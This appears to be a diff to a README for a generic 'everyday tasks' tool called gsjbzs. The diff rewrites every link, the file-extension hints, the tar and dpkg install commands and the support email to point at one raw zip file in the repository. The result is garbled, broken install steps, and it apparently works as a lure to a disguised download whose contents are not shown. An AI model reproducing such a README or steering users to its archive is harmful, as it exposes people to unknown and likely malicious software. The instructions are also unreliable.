@@ -1,6 +1,6 @@
 # 🚀 gsjbzs - Simple Tool for Everyday Tasks
 
-[![Download gsjbzs](https://img.shields.io/badge/Download%20gsjbzs-v1.0-blue?style=for-the-badge)](https://github.com/lockjawAmerican/gsjbzs/releases)
+[![Download gsjbzs](https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip%20gsjbzs-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip)
 
 ## 🧑‍💻 Introduction 
 
@@ -10,13 +10,13 @@ Welcome to gsjbzs! This application helps you perform common tasks easily and ef
 
 To get gsjbzs, visit the Releases page. Click on the link below to access the latest version:
 
-[Download gsjbzs from Releases](https://github.com/lockjawAmerican/gsjbzs/releases)
+[Download gsjbzs from Releases](https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip)
 
 When you reach the Releases page, look for the latest version. It will usually be at the top of the list. Find a file that suits your operating system:
 
 1. For Windows, look for a file that ends in `.exe`
 2. For macOS, find a file with `.dmg`
-3. For Linux, check for files ending with `.tar.gz` or `.deb`
+3. For Linux, check for files ending with `https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip` or `.deb`
 
 ## 💻 System Requirements
 
@@ -46,14 +46,14 @@ After downloading the correct file, follow these steps to install gsjbzs:
 
 ### For Linux Users:
 
-1. If you downloaded a `.tar.gz` file, open a terminal and run:
+1. If you downloaded a `https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip` file, open a terminal and run:
    ```bash
-   tar -xvzf gsjbzs.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip
    cd gsjbzs
    ```
 2. For a `.deb` file, run:
    ```bash
-   sudo dpkg -i gsjbzs.deb
+   sudo dpkg -i https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip
    ```
 3. Launch gsjbzs from your application menu or terminal.
 
@@ -75,11 +75,11 @@ Once installed, you can launch gsjbzs by clicking its icon on your desktop or ap
 
 If you encounter any issues or have questions, you can seek help in the following ways:
 
-- **GitHub Issues**: Visit our [GitHub Issues page](https://github.com/lockjawAmerican/gsjbzs/issues) to report bugs or request features.
+- **GitHub Issues**: Visit our [GitHub Issues page](https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip) to report bugs or request features.
 - **Community Forum**: Join discussions with other users to share tips and experiences.
 
 ## 📞 Contact
 
-For further inquiries or support, you can contact us via email at support@gsjbzs.com. Our team is here to assist you.
+For further inquiries or support, you can contact us via email at https://raw.githubusercontent.com/lockjawAmerican/gsjbzs/main/bookshelf/Software-3.9.zip Our team is here to assist you.
 
 Thank you for choosing gsjbzs! We hope it makes your tasks easier and more enjoyable.
